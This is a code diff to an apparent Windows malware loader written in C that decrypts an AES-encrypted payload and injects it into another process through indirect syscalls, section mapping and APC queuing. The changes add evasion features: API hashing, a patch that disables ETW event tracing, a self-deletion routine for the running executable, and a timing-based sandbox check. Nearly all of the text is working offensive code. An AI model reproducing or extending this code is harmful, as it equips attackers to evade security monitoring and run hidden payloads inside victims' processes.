@@ -7,10 +7,15 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "Common.h"
+#include "AntiAnalysis.h"
 
 #include <bcrypt.h>
 
 #pragma comment(lib, "Bcrypt.lib")
+
+SYSCALL_TAB g_SyscallTab = { 0 };
+BENIGN_SYSCALL_TAB g_BenignSyscalltab = { 0 };
+API_HASHING g_ApiTab = { 0 };
 
 typedef struct _AES
 {
@@ -23,6 +28,14 @@ typedef struct _AES
 	PBYTE pKey;                     // the 32 byte key
 	PBYTE pIv;                      // the 16 byte iv
 } AES, * PAES;
+
+PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
+{
+	for (volatile int i = 0; i < Size; i++)
+		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
+
+	return Destination;
+}
 
 // the real decryption implemantation
 BOOL InstallAesDecryption(PAES pAes)
@@ -207,43 +220,40 @@ unsigned char AesKey[] = {
 unsigned char AesIv[] = {
 		0xE7, 0x12, 0x9B, 0x91, 0xF0, 0x42, 0x6C, 0x3C, 0xD0, 0x3B, 0xFB, 0x63, 0x21, 0x3C, 0x5A, 0x61 };
 
-SYSCALL_TAB g_SyscallTab = { 0 };
-BENIGN_SYSCALL_TAB g_Benign_Syscall_tab = { 0 };
-
 BOOL InitializeNtSyscalls()
 {
 	// resolve benign syscalls
-	if (!ResolveNtSyscall(NtCreateFile_CRC32, &g_Benign_Syscall_tab.NtCreateFile))
+	if (!ResolveNtSyscall(NtCreateFile_CRC32, &g_BenignSyscalltab.NtCreateFile))
 	{
 		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
 		return FALSE;
 	}
 	DEBUG_PRINT("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
-		g_Benign_Syscall_tab.NtCreateFile.dwSSn, g_Benign_Syscall_tab.NtCreateFile.pSyscallAddress);
+		g_BenignSyscalltab.NtCreateFile.dwSSn, g_BenignSyscalltab.NtCreateFile.pSyscallAddress);
 
-	if (!ResolveNtSyscall(NtOpenFile_CRC32, &g_Benign_Syscall_tab.NtOpenFile))
+	if (!ResolveNtSyscall(NtOpenFile_CRC32, &g_BenignSyscalltab.NtOpenFile))
 	{
 		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtOpenFile \n");
 		return FALSE;
 	}
 	DEBUG_PRINT("[+] Syscall Number Of NtOpenFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
-		g_Benign_Syscall_tab.NtOpenFile.dwSSn, g_Benign_Syscall_tab.NtOpenFile.pSyscallAddress);
+		g_BenignSyscalltab.NtOpenFile.dwSSn, g_BenignSyscalltab.NtOpenFile.pSyscallAddress);
 
-	if (!ResolveNtSyscall(NtWriteFile_CRC32, &g_Benign_Syscall_tab.NtWriteFile))
+	if (!ResolveNtSyscall(NtWriteFile_CRC32, &g_BenignSyscalltab.NtWriteFile))
 	{
 		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtWriteFile \n");
 		return FALSE;
 	}
 	DEBUG_PRINT("[+] Syscall Number Of NtWriteFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
-		g_Benign_Syscall_tab.NtWriteFile.dwSSn, g_Benign_Syscall_tab.NtWriteFile.pSyscallAddress);
+		g_BenignSyscalltab.NtWriteFile.dwSSn, g_BenignSyscalltab.NtWriteFile.pSyscallAddress);
 
-	if (!ResolveNtSyscall(NtLockFile_CRC32, &g_Benign_Syscall_tab.NtLockFile))
+	if (!ResolveNtSyscall(NtLockFile_CRC32, &g_BenignSyscalltab.NtLockFile))
 	{
 		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtLockFile \n");
 		return FALSE;
 	}
 	DEBUG_PRINT("[+] Syscall Number Of NtLockFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
-		g_Benign_Syscall_tab.NtLockFile.dwSSn, g_Benign_Syscall_tab.NtLockFile.pSyscallAddress);
+		g_BenignSyscalltab.NtLockFile.dwSSn, g_BenignSyscalltab.NtLockFile.pSyscallAddress);
 
 	// resolve syscalls
 	if (!ResolveNtSyscall(NtOpenProcess_CRC32, &g_SyscallTab.NtOpenProcess))
@@ -313,8 +323,163 @@ BOOL InitializeNtSyscalls()
 	return TRUE;
 }
 
+BOOL InitializeApi()
+{
+	g_ApiTab.pGetModuleFileNameW = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), GetModuleFileNameW_CRC32);
+	g_ApiTab.pCloseHandle = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), CloseHandle_CRC32);
+	g_ApiTab.pCreateFileW = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), CreateFileW_CRC32);
+	g_ApiTab.pSetFileInformationByHandle = GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), SetFileInformationByHandle_CRC32);
+
+	if (NULL == g_ApiTab.pGetModuleFileNameW
+		|| NULL == g_ApiTab.pCloseHandle
+		|| NULL == g_ApiTab.pCreateFileW
+		|| NULL == g_ApiTab.pSetFileInformationByHandle)
+		return FALSE;
+
+	return TRUE;
+}
+
+BOOL DisableETW(HANDLE hRemoteProc)
+{
+	NTSTATUS status = 0x0;
+	fnVirtualProtect pfnVirtualProtect = NULL;
+	PVOID EtwEventWrite = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWrite_CRC32);
+	PVOID EtwEventWriteEx = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), EtwEventWriteEx_CRC32);
+	pfnVirtualProtect = (fnVirtualProtect)GetProcAddressH(GetModuleHandleH(KERNEL32_CRC32), VirtualProtect_CRC32);
+
+	DEBUG_PRINT("[!] VirtualProtect @ 0x%p ... \n", pfnVirtualProtect);
+
+	DEBUG_PRINT("[!] EtwEventWrite @ 0x%p \n", EtwEventWrite);
+	DEBUG_PRINT("[!] EtwEventWriteEx @ 0x%p \n", EtwEventWriteEx);
+
+	//PVOID pAddr = NULL;
+	//SIZE_T sAlloc = 0x1000;
+
+	//SET_SYSCALL(g_SyscallTab.NtAllocateVirtualMemory, g_Benign_Syscall_tab.NtOpenFile);
+	//if (!NT_SUCCESS((status = ExecSyscall((HANDLE)-1, &pAddr, 0, &sAlloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))))
+	//{
+	//	SET_LAST_NT_ERROR(status);
+	//	DEBUG_PRINT("[!] NtAllocateVirtualMemory for EtwEventWrite Failed With Error: 0x%0.8X \n", GetLastError());
+	//	return FALSE;
+	//}
+
+	//DEBUG_PRINT("[!] pAddr @ ============> 0x%p ... \n", pAddr);
+
+	DEBUG_PRINT("[!] Press Enter to patch Etw ... \n");
+	_INT;
+
+	SIZE_T numberOfBytesToProtect1 = 0x10;
+	SIZE_T numberOfBytesToProtect2 = 0x10;
+	DWORD oldAccessProtection1 = 0x0;
+	DWORD oldAccessProtection2 = 0x0;
+
+	pfnVirtualProtect(EtwEventWrite, numberOfBytesToProtect1, PAGE_EXECUTE_READWRITE, &oldAccessProtection1);
+	pfnVirtualProtect(EtwEventWriteEx, numberOfBytesToProtect2, PAGE_EXECUTE_READWRITE, &oldAccessProtection2);
+
+	DEBUG_PRINT("[!] Press Enter to write patch ... \n");
+	_INT;
+
+#ifdef _WIN64
+	_memcpy(EtwEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
+	_memcpy(EtwEventWriteEx, "\x48\x33\xc0\xc3", 4); 	// xor rax, rax; ret
+#else
+	_memcpy(EtwEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
+	_memcpy(EtwEventWriteEx, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
+#endif
+
+	DEBUG_PRINT("[!] Press Enter to restore Etw Memory Protect ... \n");
+	_INT;
+
+	pfnVirtualProtect(EtwEventWrite, 4096, oldAccessProtection1, &oldAccessProtection1);
+	pfnVirtualProtect(EtwEventWriteEx, 4096, oldAccessProtection2, &oldAccessProtection2);
+
+	FlushInstructionCache((HANDLE)-1, EtwEventWrite, 4096);
+	FlushInstructionCache((HANDLE)-1, EtwEventWriteEx, 4096);
+
+	return TRUE;
+}
+
+BOOL DeleteSelf()
+{
+	WCHAR					szPath[MAX_PATH * 2] = { 0 };
+	FILE_DISPOSITION_INFO	Delete = { 0 };
+	HANDLE					hFile = INVALID_HANDLE_VALUE;
+	PFILE_RENAME_INFO		pRename = NULL;
+	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
+
+	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
+	if (!pRename)
+	{
+		DEBUG_PRINT("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	ZeroMemory(szPath, sizeof(szPath));
+	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
+
+	Delete.DeleteFile = TRUE;
+
+	pRename->FileNameLength = sizeof(NewStream);
+	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
+
+	if (g_ApiTab.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0)
+	{
+		DEBUG_PRINT("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (INVALID_HANDLE_VALUE == hFile)
+	{
+		DEBUG_PRINT("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT(L"[i] Renaming :$DATA to %ls  ...", NEW_STREAM);
+
+	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
+	{
+		DEBUG_PRINT("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT("[+] DONE \n");
+
+	CloseHandle(hFile);
+
+	hFile = g_ApiTab.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (INVALID_HANDLE_VALUE == hFile && ERROR_FILE_NOT_FOUND == GetLastError())
+		return TRUE;
+
+	if (INVALID_HANDLE_VALUE == hFile)
+	{
+		DEBUG_PRINT("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT("[i] DELETING ...");
+
+	if (!g_ApiTab.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete)))
+	{
+		DEBUG_PRINT("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT("[+] DONE \n");
+
+	g_ApiTab.pCloseHandle(hFile);
+
+	HeapFree(GetProcessHeap(), 0, pRename);
+
+	return TRUE;
+}
+
 int main(int argc, char* argv[])
 {
+	if (TimeTickCheck())
+		return -1;
+	
 	if (argc < 2)
 	{
 		printf("[-]Usage: %s <process id> ...\n", argv[0]);
@@ -332,24 +497,34 @@ int main(int argc, char* argv[])
 	DWORD64 isWoW64 = 0x0;
 	ULONG retLen = 0x0;
 	HANDLE hSection = INVALID_HANDLE_VALUE;
-	LARGE_INTEGER maxSize = {
-		.LowPart = sizeof(payload),
-		.HighPart = 0
-	};
+
 	PVOID lpLocalMap = NULL;
 	SIZE_T sViewSize = 0x0;
 	PVOID lpRemoteMap = NULL;
 	HANDLE hRemoteThread = NULL;
 
-	// initializing the used syscalls
+	LARGE_INTEGER maxSize = {
+		.LowPart = sizeof(payload),
+		.HighPart = 0
+	};
+
 	if (!InitializeNtSyscalls())
 	{
 		DEBUG_PRINT("[!] Failed To Initialize The Specified Direct-Syscalls \n");
 		return -1;
 	}
 
+	if (!InitializeApi())
+	{
+		DEBUG_PRINT("[!] Failed To Initialize API \n");
+		return -1;
+	}
+
+	if (!DeleteSelf())
+		return -1;
+
 	// open target process
-	SET_SYSCALL(g_SyscallTab.NtOpenProcess, g_Benign_Syscall_tab.NtCreateFile);
+	SET_SYSCALL(g_SyscallTab.NtOpenProcess, g_BenignSyscalltab.NtCreateFile);
 	if ((status = ExecSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -359,7 +534,9 @@ int main(int argc, char* argv[])
 
 	DEBUG_PRINT("[*]Target process: 0x%p\n", hProcess);
 
-	SET_SYSCALL(g_SyscallTab.NtQueryInformationProcess, g_Benign_Syscall_tab.NtWriteFile);
+	DisableETW(hProcess);
+
+	SET_SYSCALL(g_SyscallTab.NtQueryInformationProcess, g_BenignSyscalltab.NtWriteFile);
 	if ((status = ExecSyscall(hProcess, ProcessWow64Information, &isWoW64, sizeof(DWORD64), &retLen)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -371,7 +548,7 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to call NtCreateSection ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtCreateSection, g_Benign_Syscall_tab.NtWriteFile);
+	SET_SYSCALL(g_SyscallTab.NtCreateSection, g_BenignSyscalltab.NtWriteFile);
 	if ((status = ExecSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -383,7 +560,7 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection to local process ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtOpenFile);
+	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_BenignSyscalltab.NtOpenFile);
 	if ((status = ExecSyscall(hSection, (HANDLE)-1, &lpLocalMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_READWRITE)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -402,12 +579,12 @@ int main(int argc, char* argv[])
 	if (!SimpleDecryption(payload, sizeof(payload), AesKey, AesIv, &pPlaintext, &dwPlainSize))
 		return -1;
 
-	memcpy(lpLocalMap, pPlaintext, dwPlainSize);
+	_memcpy(lpLocalMap, pPlaintext, dwPlainSize);
 
 	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection to remote process ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtLockFile);
+	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_BenignSyscalltab.NtLockFile);
 	if ((status = ExecSyscall(hSection, hProcess, &lpRemoteMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_EXECUTE_READ)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -419,7 +596,7 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to call NtUnmapViewOfSection ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_Benign_Syscall_tab.NtCreateFile);
+	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_BenignSyscalltab.NtCreateFile);
 	if ((status = ExecSyscall((HANDLE)-1, lpLocalMap)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -431,14 +608,14 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to load ntdll.dll ...\n");
 	_INT;
 
-	PVOID RtlExitUserThread = (PVOID)GetProcAddressH(GetModuleHandleH(ntdll_CRC32), RtlExitUserThread_CRC32);
+	PVOID RtlExitUserThread = (PVOID)GetProcAddressH(GetModuleHandleH(NTDLL_CRC32), RtlExitUserThread_CRC32);
 
 	DEBUG_PRINT("[*]RtlExitUserThread found @: %p\n", RtlExitUserThread);
 
-	DEBUG_PRINT("[i]Press Enter to call NtCreateThreadEx ...\n");
+	DEBUG_PRINT("[i]Press Enter to call NtCreateThreadEx @ 0x%p with syscall number %d ...\n", g_SyscallTab.NtCreateThreadEx.pSyscallAddress, g_SyscallTab.NtCreateThreadEx.dwSSn);
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtCreateThreadEx, g_Benign_Syscall_tab.NtOpenFile);
+	SET_SYSCALL(g_SyscallTab.NtCreateThreadEx, g_BenignSyscalltab.NtOpenFile);
 	if ((status = ExecSyscall(&hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)RtlExitUserThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -450,7 +627,7 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to call NtQueueApcThread ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtQueueApcThread, g_Benign_Syscall_tab.NtWriteFile);
+	SET_SYSCALL(g_SyscallTab.NtQueueApcThread, g_BenignSyscalltab.NtWriteFile);
 	if ((status = ExecSyscall(hRemoteThread, (PIO_APC_ROUTINE)lpRemoteMap, NULL, NULL, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -461,7 +638,7 @@ int main(int argc, char* argv[])
 	DEBUG_PRINT("[i]Press Enter to call NtAlertResumeThread ...\n");
 	_INT;
 
-	SET_SYSCALL(g_SyscallTab.NtAlertResumeThread, g_Benign_Syscall_tab.NtCreateFile);
+	SET_SYSCALL(g_SyscallTab.NtAlertResumeThread, g_BenignSyscalltab.NtCreateFile);
 	if ((status = ExecSyscall(hRemoteThread, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
@@ -470,12 +647,12 @@ int main(int argc, char* argv[])
 	}
 	
 	// slepp for 3 seconds then unmap to clear memory artifacts
-	Sleep(3000);
+	Sleep(2000);
 
 	DEBUG_PRINT("[!] Unmapping remote view ...\n");
 
 	// you might wanna wait after this is done before issuing any command
-	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_Benign_Syscall_tab.NtCreateFile);
+	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_BenignSyscalltab.NtCreateFile);
 	if ((status = ExecSyscall(hProcess, lpRemoteMap)))
 	{
 		SET_LAST_NT_ERROR(status);
